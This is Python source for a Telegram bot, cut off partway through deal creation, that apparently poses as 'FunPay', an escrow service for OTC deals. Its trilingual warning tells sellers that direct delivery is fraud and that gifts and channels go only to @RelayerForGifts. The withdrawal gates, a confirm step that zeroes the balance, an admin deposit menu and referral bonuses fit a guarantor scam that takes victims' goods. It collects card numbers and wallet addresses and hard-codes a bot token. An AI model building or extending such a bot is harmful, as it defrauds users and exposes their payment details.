import asyncio
import logging
import random
import string
import os
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command, CommandObject
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.types import (
    InlineKeyboardButton, FSInputFile, CallbackQuery,
    InputMediaPhoto, InlineQueryResultArticle, InputTextMessageContent
)

logging.basicConfig(level=logging.INFO)

BOT_TOKEN = "8997127755:AAGyqfwJnycx1OLru5BQD95nHHF3bH1NkBQ"

# =====================================================
# НАСТРОЙКИ
# =====================================================
MANAGER_USER = "RelayerForGifts"
HELPER_USER = "RelayerForGifts"
SUPPORT_LINK = f"https://t.me/{MANAGER_USER}"

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
MAIN_PHOTO = os.path.join(BASE_DIR, "mani.jpg")
DEAL_PHOTO = os.path.join(BASE_DIR, "mani.jpg")
REKV_PHOTO = os.path.join(BASE_DIR, "mani.jpg")


def get_photo(photo_path):
    if os.path.exists(photo_path) and os.path.getsize(photo_path) > 0:
        return FSInputFile(photo_path)
    return None


# =====================================================
# ПРЕМИУМ ЭМОДЗИ
# =====================================================
EMOJI_IDS = {
    # --- старые ключи (не удаляй) ---
    "rekvizity": "5445221832074483553",
    "create_deal": "5458603043203327669",
    "referral": "5271604874419647061",
    "profile": "5461117441612462242",
    "faq": "5436113877181941026",
    "support": "5395695537687123235",
    "language": "5447410659077661506",
    "stroke1": "5312326644764018054",
    "stroke2": "5312419154064607942",
    "stroke3": "5310191758255099001",
    "stroke4": "5312365458383474419",
    "deal_chat": "5325547803936572038",
    "down_menu": "5406745015365943482",
    "balance": "5427168083074628963",
    "nub1": "5382322671679708881",
    "nub2": "5381990043642502553",
    "nub3": "5381879959335738545",
    "nub4": "5382054253403577563",
    "nub5": "5391197405553107640",
    "nub6": "5390966190283694453",
    "flagr": "5449408995691341691",
    "flagr2": "5240228673738527951",
    "flagr3": "5312361253610475399",
    "flagr4": "5445353829304387411",
    "flagr5": "5395695537687123235",
    "flagr6": "5197288647275071607",
    "crystal": "5427168083074628963",
    "rubles": "5377746319601324795",
    "UAH": "5377505475015235101",
    "BYNS": "5199552030615558774",
    "TEN": "5201692367437974073",
    "USD": "5197434882321567830",
    "STR": "5438496463044752972",
    "DEP": "5438496463044752972",
    "WITCHD": "5287231198098117669",
    "dealc": "5267102644886853973",
    "dealty": "5197269100878907942",
    "dealtov": "5444856076954520455",
    "deal": "5305699699204837855",
    "seller": "5312326644764018054",
    "money_home": "5361853256978959774",
    "user_id": "5408916348967348391",
    "dealuid": "5447644880824181073",
    "dealui1": "5409379376506630236",
    "right": "5303530294043753603",
    "confirm": "5395695537687123235",
    "warning": "5395695537687123235",

    # --- новые work-слоты ---
    "work1":  "6041921818896372382", "work2":  "5282806230732021905", "work3":  "5890925363067886150", "work4":  "5920515922505765329", "work5":  "5902056028513505203",
    "work6":  "6030445631921721471", "work7":  "", "work8":  "", "work9":  "", "work10": "",
    "work11": "", "work12": "", "work13": "", "work14": "", "work15": "",
    "work16": "", "work17": "", "work18": "", "work19": "", "work20": "",
    "work21": "", "work22": "", "work23": "", "work24": "", "work25": "",
    "work26": "", "work27": "", "work28": "", "work29": "", "work30": "",
    "work31": "", "work32": "", "work33": "", "work34": "", "work35": "",
    "work36": "", "work37": "", "work38": "", "work39": "", "work40": "",
    "work41": "", "work42": "", "work43": "", "work44": "", "work45": "",
    "work46": "", "work47": "", "work48": "", "work49": "", "work50": "",
    "work51": "", "work52": "", "work53": "", "work54": "", "work55": "",
}


def emoji(key: str, fallback: str = "✨") -> str:
    eid_ = EMOJI_IDS.get(key)
    if eid_:
        return f'<tg-emoji emoji-id="{eid_}">{fallback}</tg-emoji>'
    return fallback


def eid(*keys):
    """Возвращает первый непустой ID из списка ключей (для icon_custom_emoji_id)."""
    for k in keys:
        v = EMOJI_IDS.get(k)
        if v:
            return v
    return None


# =====================================================
# БЕЗОПАСНОЕ РЕДАКТИРОВАНИЕ СООБЩЕНИЙ
# =====================================================
async def safe_edit(callback: CallbackQuery, text: str, markup, use_photo: bool = False):
    msg = callback.message
    try:
        if msg.photo:
            if use_photo:
                photo = get_photo(MAIN_PHOTO)
                if photo:
                    await msg.edit_media(
                        media=InputMediaPhoto(media=photo, caption=text, parse_mode="HTML"),
                        reply_markup=markup
                    )
                else:
                    await msg.edit_caption(caption=text, reply_markup=markup, parse_mode="HTML")
            else:
                await msg.edit_caption(caption=text, reply_markup=markup, parse_mode="HTML")
        else:
            await msg.edit_text(text=text, reply_markup=markup, parse_mode="HTML")
    except Exception as e:
        logging.warning(f"safe_edit fallback: {e}")
        photo = get_photo(MAIN_PHOTO) if use_photo else None
        if photo:
            await msg.answer_photo(photo=photo, caption=text, reply_markup=markup, parse_mode="HTML")
        else:
            await msg.answer(text=text, reply_markup=markup, parse_mode="HTML")


# =====================================================
# ЛОКАЛИЗАЦИЯ
# =====================================================
DEFAULT_LANG = "ru"
user_lang = {}

TEXTS = {
    "ru": {
        "welcome": (
            f"{emoji('work1', '👋')} <b>Добро пожаловать</b>\n\n"
            f"{emoji('work2', '🤖')} <b>FunPay</b> — Мы специализированный сервис по "
            f"обеспечению безопасности внебиржевых сделок.\n\n"
            f"{emoji('work3', '✨')} Автоматизированный алгоритм исполнения.\n"
            f"{emoji('work4', '⚡')} Скорость и автоматизация.\n"
            f"{emoji('work5', '💳')} Удобный и быстрый вывод средств.\n\n"
            f"• Комиссия сервиса: <b>1%</b>\n"
            f"• Режим работы: <b>24/7</b>\n\n"
            f"{emoji('work6', '🛡')} <b>Выберите нужный раздел ниже</b>"
        ),
        "choose_lang": "🌍 <b>Выберите язык / Choose language / 选择语言</b>",
        "lang_set": "✅ Язык установлен: <b>Русский</b>",
        "btn_create": "Создать сделку",
        "btn_lang": "Язык / Lang",
        "btn_profile": "Профиль",
        "btn_support": "Техподдержка",
        "warning_title": "⚠️ <b>ПРЕДУПРЕЖДЕНИЕ ПЕРЕД СОЗДАНИЕМ СДЕЛКИ</b>",
        "warning_body": (
            "• Передача любого товара напрямую покупателю — это мошенничество!\n"
            f"• Нельзя передавать напрямую. Передавайте подарок только на официальный аккаунт @{HELPER_USER}.\n"
            "• Если вы продаёте канал, передайте владельца канала официальному аккаунту.\n\n"
            f"👉 <b>Всегда отправляйте товар только на @{HELPER_USER}.</b>"
        ),
        "btn_continue": "Продолжить",
        "btn_back": "Вернуться в меню",
    },
    "en": {
        "welcome": (
            f"{emoji('work1', '👋')} <b>Welcome</b>\n\n"
            f"{emoji('work2', '🤖')} <b>FunPay</b> — We are a specialized service "
            f"for ensuring the security of OTC deals.\n\n"
            f"{emoji('work3', '✨')} Automated execution algorithm.\n"
            f"{emoji('work4', '⚡')} Speed and automation.\n"
            f"{emoji('work5', '💳')} Convenient and fast withdrawal.\n\n"
            f"• Service commission: <b>1%</b>\n"
            f"• Working hours: <b>24/7</b>\n\n"
            f"{emoji('work6', '🛡')} <b>Choose a section below</b>"
        ),
        "choose_lang": "🌍 <b>Choose language / Выберите язык / 选择语言</b>",
        "lang_set": "✅ Language set: <b>English</b>",
        "btn_create": "Create deal",
        "btn_lang": "Language / Lang",
        "btn_profile": "Profile",
        "btn_support": "Support",
        "warning_title": "⚠️ <b>WARNING BEFORE CREATING A DEAL</b>",
        "warning_body": (
            "• Transferring any goods directly to the buyer is fraud!\n"
            f"• Do not transfer directly. Send the gift only to the official account @{HELPER_USER}.\n"
            "• If you sell a channel, transfer the channel owner to the official account.\n\n"
            f"👉 <b>Always send the goods only to @{HELPER_USER}.</b>"
        ),
        "btn_continue": "Continue",
        "btn_back": "Back to menu",
    },
    "zh": {
        "welcome": (
            f"{emoji('work1', '👋')} <b>欢迎</b>\n\n"
            f"{emoji('work2', '🤖')} <b>FunPay</b> — 我们是一家专门保障场外交易安全的服务。\n\n"
            f"{emoji('work3', '✨')} 自动化执行算法。\n"
            f"{emoji('work4', '⚡')} 快速与自动化。\n"
            f"{emoji('work5', '💳')} 便捷快速的提现。\n\n"
            f"• 服务佣金：<b>1%</b>\n"
            f"• 工作时间：<b>24/7</b>\n\n"
            f"{emoji('work6', '🛡')} <b>请在下方选择栏目</b>"
        ),
        "choose_lang": "🌍 <b>选择语言 / Choose language / Выберите язык</b>",
        "lang_set": "✅ 语言已设置：<b>中文</b>",
        "btn_create": "创建交易",
        "btn_lang": "语言 / Lang",
        "btn_profile": "个人资料",
        "btn_support": "技术支持",
        "warning_title": "⚠️ <b>创建交易前的警告</b>",
        "warning_body": (
            "• 直接将商品转给买家属于欺诈行为！\n"
            f"• 禁止直接转让。请仅将礼物发送至官方账户 @{HELPER_USER}。\n"
            "• 如果您出售频道，请将频道所有者转让给官方账户。\n\n"
            f"👉 <b>请务必将商品仅发送至 @{HELPER_USER}。</b>"
        ),
        "btn_continue": "继续",
        "btn_back": "返回菜单",
    },
}


def t(user_id: int, key: str) -> str:
    lang = user_lang.get(user_id, DEFAULT_LANG)
    return TEXTS.get(lang, TEXTS[DEFAULT_LANG]).get(key, TEXTS[DEFAULT_LANG].get(key, key))


# =====================================================
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

deals = {}
user_cards = {}
user_ton = {}
user_stars = {}
user_usdt = {}
user_btc = {}
user_balance = {}
user_deals_count = {}
user_referrals = {}
admins = set()


class Form(StatesGroup):
    waiting_for_role_confirm = State()
    waiting_for_card = State()
    waiting_for_ton = State()
    waiting_for_star = State()
    waiting_for_usdt = State()
    waiting_for_btc = State()
    waiting_for_currency = State()
    waiting_for_deal_amount = State()
    waiting_for_deal_desc = State()
    admin_deposit_amount = State()


def generate_deal_code(length=8):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))


# =====================================================
# МЕНЮ
# =====================================================

def get_main_menu(user_id: int):
    b = InlineKeyboardBuilder()
    b.row(InlineKeyboardButton(
        text=t(user_id, "btn_create"),
        callback_data="create_deal",
        icon_custom_emoji_id=eid("create_deal"),
        style="success"
    ))
    b.row(
        InlineKeyboardButton(
            text=t(user_id, "btn_lang"),
            callback_data="swap_lang",
            icon_custom_emoji_id=eid("language"),
            style="success"
        ),
        InlineKeyboardButton(
            text=t(user_id, "btn_profile"),
            callback_data="profile",
            icon_custom_emoji_id=eid("profile"),
            style="success"
        )
    )
    b.row(InlineKeyboardButton(
        text=t(user_id, "btn_support"),
        url=SUPPORT_LINK,
        icon_custom_emoji_id=eid("support"),
        style="success"
    ))
    return b.as_markup()


def get_lang_menu():
    b = InlineKeyboardBuilder()
    b.row(InlineKeyboardButton(text="🇷🇺 Русский", callback_data="setlang_ru", style="success"))
    b.row(InlineKeyboardButton(text="🇬🇧 English", callback_data="setlang_en", style="success"))
    b.row(InlineKeyboardButton(text="🇨🇳 中文", callback_data="setlang_zh", style="success"))
    return b.as_markup()


def get_profile_menu(user_id: int):
    b = InlineKeyboardBuilder()
    b.row(
        InlineKeyboardButton(text="Мои реквизиты", callback_data="manage_details",
                             icon_custom_emoji_id=eid("work13", "rekvizity"), style="success"),
        InlineKeyboardButton(text="Баланс", callback_data="balance",
                             icon_custom_emoji_id=eid("work14", "balance"), style="success")
    )
    b.row(
        InlineKeyboardButton(text="Рефералы", callback_data="referrals",
                             icon_custom_emoji_id=eid("work15", "referral"), style="success"),
        InlineKeyboardButton(text="Мои сделки", callback_data="my_deals",
                             icon_custom_emoji_id=eid("work16", "dealuid"), style="success")
    )
    b.row(InlineKeyboardButton(text="Назад в меню", callback_data="back_to_menu",
                               icon_custom_emoji_id=eid("work17", "down_menu"), style="danger"))
    return b.as_markup()


def get_role_menu(user_id: int):
    b = InlineKeyboardBuilder()
    b.row(
        InlineKeyboardButton(text="Я продавец", callback_data="role_seller",
                             icon_custom_emoji_id=eid("work20", "seller"), style="success"),
        InlineKeyboardButton(text="Я покупатель", callback_data="role_buyer",
                             icon_custom_emoji_id=eid("work21", "dealui1"), style="success")
    )
    b.row(InlineKeyboardButton(text="Назад в меню", callback_data="back_to_menu",
                               icon_custom_emoji_id=eid("work17", "down_menu"), style="danger"))
    return b.as_markup()


def get_warning_menu(user_id: int):
    b = InlineKeyboardBuilder()
    b.row(InlineKeyboardButton(text=t(user_id, "btn_continue"), callback_data="continue_create_deal",
                               icon_custom_emoji_id=eid("confirm"), style="success"))
    b.row(InlineKeyboardButton(text=t(user_id, "btn_back"), callback_data="back_to_menu",
                               icon_custom_emoji_id=eid("work17", "down_menu"), style="success"))
    return b.as_markup()


def get_payment_method_menu(user_id: int):
    b = InlineKeyboardBuilder()
    b.row(
        InlineKeyboardButton(text="Карта", callback_data="pay_card",
                             icon_custom_emoji_id=eid("work24", "rubles"), style="success"),
        InlineKeyboardButton(text="Stars", callback_data="pay_stars",
                             icon_custom_emoji_id=eid("work25", "STR"), style="success")
    )
    b.row(InlineKeyboardButton(text="Крипта", callback_data="pay_crypto",
                               icon_custom_emoji_id=eid("work26", "crystal"), style="success"))
    b.row(InlineKeyboardButton(text="Назад", callback_data="back_to_role",
                               icon_custom_emoji_id=eid("work27", "down_menu"), style="success"))
    b.row(InlineKeyboardButton(text="Назад в меню", callback_data="back_to_menu",
                               icon_custom_emoji_id=eid("work28", "down_menu"), style="danger"))
    return b.as_markup()


def get_card_currency_menu():
    b = InlineKeyboardBuilder()
    b.row(
        InlineKeyboardButton(text="RUB 🇷🇺", callback_data="set_cur_RUB",
                             icon_custom_emoji_id=eid("work52", "rubles"), style="success"),
        InlineKeyboardButton(text="UAH 🇺🇦", callback_data="set_cur_UAH",
                             icon_custom_emoji_id=eid("work53", "UAH"), style="success")
    )
    b.row(
        InlineKeyboardButton(text="BYN 🇧🇾", callback_data="set_cur_BYN",
                             icon_custom_emoji_id=eid("work55", "BYNS"), style="success"),
        InlineKeyboardButton(text="KZT 🇰🇿", callback_data="set_cur_KZT",
                             icon_custom_emoji_id=eid("work54", "TEN"), style="success")
    )
    b.row(InlineKeyboardButton(text="USD 🇺🇸", callback_data="set_cur_USD",
                               icon_custom_emoji_id=eid("USD"), style="success"))
    b.row(InlineKeyboardButton(text="↩️ Назад", callback_data="continue_create_deal",
                               icon_custom_emoji_id=eid("work27", "down_menu"), style="success"))
    return b.as_markup()


def get_crypto_currency_menu():
    b = InlineKeyboardBuilder()
    b.row(InlineKeyboardButton(text="TON 💎", callback_data="set_cur_TON",
                               icon_custom_emoji_id=eid("work49", "crystal"), style="success"))
    b.row(InlineKeyboardButton(text="USDT 💵", callback_data="set_cur_USDT",
                               icon_custom_emoji_id=eid("work50", "USD"), style="success"))
    b.row(InlineKeyboardButton(text="BTC ₿", callback_data="set_cur_BTC",
                               icon_custom_emoji_id=eid("work51", "crystal"), style="success"))
    b.row(InlineKeyboardButton(text="↩️ Назад", callback_data="continue_create_deal",
                               icon_custom_emoji_id=eid("work27", "down_menu"), style="success"))
    return b.as_markup()


def get_details_menu():
    b = InlineKeyboardBuilder()
    b.row(
        InlineKeyboardButton(text="TON-кошелёк", callback_data="edit_ton",
                             icon_custom_emoji_id=eid("work41", "crystal"), style="success"),
        InlineKeyboardButton(text="Карта", callback_data="edit_card",
                             icon_custom_emoji_id=eid("work42", "rubles"), style="success")
    )
    b.row(
        InlineKeyboardButton(text="@username (Stars)", callback_data="edit_star",
                             icon_custom_emoji_id=eid("work43", "STR"), style="success"),
        InlineKeyboardButton(text="USDT-кошелёк", callback_data="edit_usdt",
                             icon_custom_emoji_id=eid("work44", "USD"), style="success")
    )
    b.row(InlineKeyboardButton(text="BTC-кошелёк", callback_data="edit_btc",
                               icon_custom_emoji_id=eid("work45", "crystal"), style="success"))
    b.row(InlineKeyboardButton(text="Назад в меню", callback_data="back_to_menu",
                               icon_custom_emoji_id=eid("work17", "down_menu"), style="danger"))
    return b.as_markup()


def get_back_menu():
    b = InlineKeyboardBuilder()
    b.row(InlineKeyboardButton(text="↩️ Назад", callback_data="manage_details",
                               icon_custom_emoji_id=eid("work27", "down_menu"), style="success"))
    return b.as_markup()


def get_admin_deposit_menu():
    b = InlineKeyboardBuilder()
    b.row(
        InlineKeyboardButton(text="STARS", callback_data="adm_dep_STR",
                             icon_custom_emoji_id=eid("work48", "STR"), style="success"),
        InlineKeyboardButton(text="TON", callback_data="adm_dep_TON",
                             icon_custom_emoji_id=eid("work49", "crystal"), style="success")
    )
    b.row(
        InlineKeyboardButton(text="USDT", callback_data="adm_dep_USDT",
                             icon_custom_emoji_id=eid("work50", "USD"), style="success"),
        InlineKeyboardButton(text="BTC", callback_data="adm_dep_BTC",
                             icon_custom_emoji_id=eid("work51", "crystal"), style="success")
    )
    b.row(
        InlineKeyboardButton(text="RUB", callback_data="adm_dep_RUB",
                             icon_custom_emoji_id=eid("work52", "rubles"), style="success"),
        InlineKeyboardButton(text="UAH", callback_data="adm_dep_UAH",
                             icon_custom_emoji_id=eid("work53", "UAH"), style="success")
    )
    b.row(
        InlineKeyboardButton(text="KZT", callback_data="adm_dep_KZT",
                             icon_custom_emoji_id=eid("work54", "TEN"), style="success"),
        InlineKeyboardButton(text="BYN", callback_data="adm_dep_BYN",
                             icon_custom_emoji_id=eid("work55", "BYNS"), style="success")
    )
    b.row(InlineKeyboardButton(text="Отмена", callback_data="adm_dep_cancel",
                               icon_custom_emoji_id=eid("work47", "warning"), style="danger"))
    return b.as_markup()


# =====================================================
# СТАРТ
# =====================================================

@dp.message(Command("start"))
async def start_command(message: types.Message, state: FSMContext, command: CommandObject = None):
    await state.clear()
    args = command.args if command else None

    if args and args.startswith("ref_"):
        parts = args.split("_")
        if len(parts) >= 2 and parts[1].isdigit():
            referrer_id = int(parts[1])
            if referrer_id != message.from_user.id:
                user_balance[referrer_id] = user_balance.get(referrer_id, 0) + 50
                user_referrals[referrer_id] = user_referrals.get(referrer_id, 0) + 1
                try:
                    await bot.send_message(
                        referrer_id,
                        f"🎉 <b>Новый реферал!</b>\n\n"
                        f"Пользователь @{message.from_user.username or 'Неизвестно'} "
                        f"зарегистрировался по вашей ссылке.\n"
                        f"Начислен бонус: 50 RUB",
                        parse_mode="HTML"
                    )
                except Exception as e:
                    logging.error(f"Ошибка реферала: {e}")

    if args and args.startswith("deal_"):
        code = args.replace("deal_", "")
        if code in deals:
            await handle_deal_entry(message, code)
            return

    if message.from_user.id not in user_lang:
        await message.answer(
            t(message.from_user.id, "choose_lang"),
            reply_markup=get_lang_menu(),
            parse_mode="HTML"
        )
        return

    await show_main_menu(message, message.from_user.id)


async def show_main_menu(message: types.Message, user_id: int):
    text = t(user_id, "welcome")
    photo = get_photo(MAIN_PHOTO)
    if photo:
        await message.answer_photo(photo=photo, caption=text,
                                   reply_markup=get_main_menu(user_id), parse_mode="HTML")
    else:
        await message.answer(text=text, reply_markup=get_main_menu(user_id), parse_mode="HTML")


# =====================================================
# ЯЗЫК
# =====================================================

@dp.callback_query(F.data.startswith("setlang_"))
async def set_language(callback: CallbackQuery, state: FSMContext):
    lang = callback.data.split("_")[1]
    if lang not in TEXTS:
        lang = DEFAULT_LANG
    user_lang[callback.from_user.id] = lang
    await state.clear()
    try:
        await callback.message.edit_text(t(callback.from_user.id, "lang_set"), parse_mode="HTML")
    except Exception:
        pass
    await show_main_menu(callback.message, callback.from_user.id)
    await callback.answer()


@dp.callback_query(F.data == "swap_lang")
async def swap_lang(callback: CallbackQuery):
    await safe_edit(callback, t(callback.from_user.id, "choose_lang"), get_lang_menu())
    await callback.answer()


# =====================================================
# ПРОФИЛЬ
# =====================================================

@dp.callback_query(F.data == "profile")
async def profile_callback(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    username = f"@{callback.from_user.username}" if callback.from_user.username else "—"

    balance = user_balance.get(user_id, 0)
    deals_count = user_deals_count.get(user_id, 0)
    active_deals = sum(1 for d in deals.values() if d.get('creator_id') == user_id)
    referrals_count = user_referrals.get(user_id, 0)

    balance_line = (
        f"{emoji('work8', '💰')} <b>Баланс:</b>\n"
        f"{emoji('work9', '🤍')} <i>Ваш баланс пока пуст</i>\n\n"
    ) if balance == 0 else (
        f"{emoji('work8', '💰')} <b>Баланс:</b> <b>{balance:.2f} RUB</b>\n\n"
    )

    text = (
        f"{emoji('work7', '👤')} <b>Профиль</b> · {username}\n\n"
        f"{balance_line}"
        f"{emoji('work10', '📊')} <b>Успешных сделок:</b> <b>{deals_count}</b>\n"
        f"{emoji('work11', '🕒')} <b>Активных сделок:</b> <b>{active_deals}</b>\n"
        f"{emoji('work12', '👥')} <b>Рефералов:</b> <b>{referrals_count}</b>\n\n"
        f"<b>Выберите действие:</b>"
    )
    await safe_edit(callback, text, get_profile_menu(user_id), use_photo=True)
    await callback.answer()


@dp.callback_query(F.data == "balance")
async def balance_callback(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    balance = user_balance.get(user_id, 0)
    text = f"{emoji('work8', '💰')} <b>Ваш баланс</b>\n\nДоступно: <b>{balance:.2f} RUB</b>"
    b = InlineKeyboardBuilder()
    b.row(InlineKeyboardButton(text="Пополнить", callback_data="deposit",
                               icon_custom_emoji_id=eid("DEP"), style="success"))
    b.row(InlineKeyboardButton(text="Вывести", callback_data="withdraw",
                               icon_custom_emoji_id=eid("WITCHD"), style="success"))
    b.row(InlineKeyboardButton(text="↩️ Назад", callback_data="profile",
                               icon_custom_emoji_id=eid("work27", "down_menu"), style="danger"))
    await safe_edit(callback, text, b.as_markup())
    await callback.answer()


@dp.callback_query(F.data == "referrals")
async def referrals_callback(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    ref_count = user_referrals.get(user_id, 0)
    bot_info = await bot.get_me()
    ref_link = f"https://t.me/{bot_info.username}?start=ref_{user_id}_x"
    text = (
        f"{emoji('work15', '👥')} <b>Реферальная система</b>\n\n"
        f"Приглашено: <b>{ref_count}</b>\n"
        f"Бонус за друга: <b>50 RUB</b>\n\n"
        f"Ваша ссылка:\n<code>{ref_link}</code>"
    )
    b = InlineKeyboardBuilder()
    b.row(InlineKeyboardButton(text="↩️ Назад", callback_data="profile",
                               icon_custom_emoji_id=eid("work27", "down_menu"), style="danger"))
    await safe_edit(callback, text, b.as_markup())
    await callback.answer()


@dp.callback_query(F.data == "my_deals")
async def my_deals_callback(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    user_deals = [d for d in deals.values() if d.get('creator_id') == user_id]
    if not user_deals:
        text = f"{emoji('work16', '📦')} <b>Мои сделки</b>\n\n<i>У вас пока нет активных сделок.</i>"
    else:
        lines = [f"{emoji('work16', '📦')} <b>Мои сделки</b>\n"]
        for d in user_deals:
            lines.append(f"• {d['description'][:40]} — {d['amount']} {d['currency']}")
        text = "\n".join(lines)
    b = InlineKeyboardBuilder()
    b.row(InlineKeyboardButton(text="↩️ Назад", callback_data="profile",
                               icon_custom_emoji_id=eid("work27", "down_menu"), style="danger"))
    await safe_edit(callback, text, b.as_markup())
    await callback.answer()


# =====================================================
# ДЕПОЗИТ / ВЫВОД
# =====================================================

@dp.callback_query(F.data == "deposit")
async def deposit_balance(callback: types.CallbackQuery):
    text = f"🏦 <b>Пополнение баланса</b>\n\nОбратитесь в поддержку: @{MANAGER_USER}"
    b = InlineKeyboardBuilder()
    b.row(InlineKeyboardButton(text="Написать в поддержку", url=SUPPORT_LINK,
                               icon_custom_emoji_id=eid("support"), style="success"))
    b.row(InlineKeyboardButton(text="↩️ Назад", callback_data="profile",
                               icon_custom_emoji_id=eid("work27", "down_menu"), style="success"))
    await safe_edit(callback, text, b.as_markup())
    await callback.answer()


@dp.callback_query(F.data == "withdraw")
async def withdraw_balance(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    balance = user_balance.get(user_id, 0)
    deals_count = user_deals_count.get(user_id, 0)

    if balance < 1000:
        text = f"❌ Недостаточно средств.\nБаланс: {balance:.2f} RUB\nМинимум: 1000 RUB"
        b = InlineKeyboardBuilder()
        b.row(InlineKeyboardButton(text="💰 Пополнить", callback_data="deposit", style="success"))
        b.row(InlineKeyboardButton(text="↩️ Назад", callback_data="profile", style="success"))
        await safe_edit(callback, text, b.as_markup())
        await callback.answer()
        return

    if deals_count < 2:
        text = f"❌ Недостаточно сделок.\nСделок: {deals_count}\nНужно: 2"
        b = InlineKeyboardBuilder()
        b.row(InlineKeyboardButton(text="↩️ Назад", callback_data="profile", style="success"))
        await safe_edit(callback, text, b.as_markup())
        await callback.answer()
        return

    text = f"💸 <b>Вывод</b>\n\nДоступно: {balance:.2f} RUB\nСделок: {deals_count}"
    b = InlineKeyboardBuilder()
    b.row(InlineKeyboardButton(text="✅ Подтвердить", callback_data="confirm_withdraw", style="success"))
    b.row(InlineKeyboardButton(text="↩️ Назад", callback_data="profile", style="success"))
    await safe_edit(callback, text, b.as_markup())
    await callback.answer()


@dp.callback_query(F.data == "confirm_withdraw")
async def confirm_withdraw(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    balance = user_balance.get(user_id, 0)
    user_balance[user_id] = 0
    text = f"✅ Заявка на вывод отправлена!\nСумма: {balance:.2f} RUB"
    b = InlineKeyboardBuilder()
    b.row(InlineKeyboardButton(text="↩️ В меню", callback_data="back_to_menu", style="success"))
    await safe_edit(callback, text, b.as_markup())
    for admin_id in admins:
        try:
            await bot.send_message(
                admin_id,
                f"🔔 <b>Заявка на вывод</b>\n@{callback.from_user.username or '—'}\n{balance:.2f} RUB\nID: {user_id}",
                parse_mode="HTML"
            )
        except Exception:
            pass
    await callback.answer()


# =====================================================
# F.A.Q
# =====================================================

@dp.callback_query(F.data == "FAQ")
async def faq_callback(callback: types.CallbackQuery):
    text = (
        f"{emoji('faq', '❓')} F.A.Q\n\n"
        f"{emoji('nub1', '📞')} Бот — автоматический гарант сделок.\n\n"
        f"{emoji('nub2', '📞')} Продать можно всё: NFT, каналы, коды.\n\n"
        f"{emoji('nub3', '📞')} Сделки автоматизированы.\n\n"
        f"{emoji('nub5', '📞')} Поддержка 24/7."
    )
    b = InlineKeyboardBuilder()
    b.row(InlineKeyboardButton(text="Написать в поддержку", url=SUPPORT_LINK,
                               icon_custom_emoji_id=eid("support"), style="success"))
    b.row(InlineKeyboardButton(text="↩️ В меню", callback_data="back_to_menu", style="success"))
    await safe_edit(callback, text, b.as_markup())
    await callback.answer()


# =====================================================
# РЕКВИЗИТЫ
# =====================================================

def build_details_text(user_id: int) -> str:
    ton = user_ton.get(user_id, "—")
    card = user_cards.get(user_id, "—")
    stars = user_stars.get(user_id, "—")
    usdt = user_usdt.get(user_id, "—")
    btc = user_btc.get(user_id, "—")
    return (
        f"{emoji('work40', '💎')} <b>Мои реквизиты</b>\n\n"
        f"<blockquote>"
        f"{emoji('work41', '💎')} <b>TON-кошелёк:</b> <code>{ton}</code>\n"
        f"{emoji('work42', '💳')} <b>Карта:</b> <code>{card}</code>\n"
        f"{emoji('work43', '⭐')} <b>Stars:</b> <code>{stars}</code>\n"
        f"{emoji('work44', '💵')} <b>USDT (TRC20):</b> <code>{usdt}</code>\n"
        f"{emoji('work45', '₿')} <b>BTC:</b> <code>{btc}</code>"
        f"</blockquote>"
    )


@dp.callback_query(F.data == "manage_details")
async def manage_details(callback: types.CallbackQuery):
    text = build_details_text(callback.from_user.id)
    await safe_edit(callback, text, get_details_menu())
    await callback.answer()


@dp.callback_query(F.data == "edit_card")
async def edit_card_btn(callback: types.CallbackQuery, state: FSMContext):
    await safe_edit(
        callback,
        "💳 <b>Отправьте реквизиты карты:</b>\n\n<code>Банк - Номер карты</code>",
        get_back_menu()
    )
    await state.set_state(Form.waiting_for_card)
    await callback.answer()


@dp.callback_query(F.data == "edit_ton")
async def edit_ton_btn(callback: types.CallbackQuery, state: FSMContext):
    await safe_edit(callback, "💎 <b>Отправьте адрес TON-кошелька:</b>", get_back_menu())
    await state.set_state(Form.waiting_for_ton)
    await callback.answer()


@dp.callback_query(F.data == "edit_star")
async def edit_star_btn(callback: types.CallbackQuery, state: FSMContext):
    await safe_edit(callback, "⭐ <b>Введите @username получателя звезд:</b>", get_back_menu())
    await state.set_state(Form.waiting_for_star)
    await callback.answer()


@dp.callback_query(F.data == "edit_usdt")
async def edit_usdt_btn(callback: types.CallbackQuery, state: FSMContext):
    await safe_edit(
        callback,
        "💵 <b>Отправьте адрес USDT-кошелька (TRC20 / ERC20):</b>",
        get_back_menu()
    )
    await state.set_state(Form.waiting_for_usdt)
    await callback.answer()


@dp.callback_query(F.data == "edit_btc")
async def edit_btc_btn(callback: types.CallbackQuery, state: FSMContext):
    await safe_edit(callback, "₿ <b>Отправьте адрес BTC-кошелька:</b>", get_back_menu())
    await state.set_state(Form.waiting_for_btc)
    await callback.answer()


async def _save_detail_and_show(message: types.Message, state: FSMContext):
    await state.clear()
    await message.answer(f"✅ Сохранено:\n<code>{message.text}</code>", parse_mode="HTML")
    await message.answer(
        text=build_details_text(message.from_user.id),
        reply_markup=get_details_menu(),
        parse_mode="HTML"
    )


@dp.message(Form.waiting_for_card)
async def card_received(message: types.Message, state: FSMContext):
    user_cards[message.from_user.id] = message.text
    await _save_detail_and_show(message, state)


@dp.message(Form.waiting_for_ton)
async def ton_received(message: types.Message, state: FSMContext):
    user_ton[message.from_user.id] = message.text
    await _save_detail_and_show(message, state)


@dp.message(Form.waiting_for_star)
async def star_received(message: types.Message, state: FSMContext):
    user_stars[message.from_user.id] = message.text
    await _save_detail_and_show(message, state)


@dp.message(Form.waiting_for_usdt)
async def usdt_received(message: types.Message, state: FSMContext):
    user_usdt[message.from_user.id] = message.text
    await _save_detail_and_show(message, state)


@dp.message(Form.waiting_for_btc)
async def btc_received(message: types.Message, state: FSMContext):
    user_btc[message.from_user.id] = message.text
    await _save_detail_and_show(message, state)


# =====================================================
# СОЗДАНИЕ СДЕЛКИ
# =====================================================

@dp.callback_query(F.data == "create_deal")
async def create_deal_role(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    user_id = callback.from_user.id
    text = (
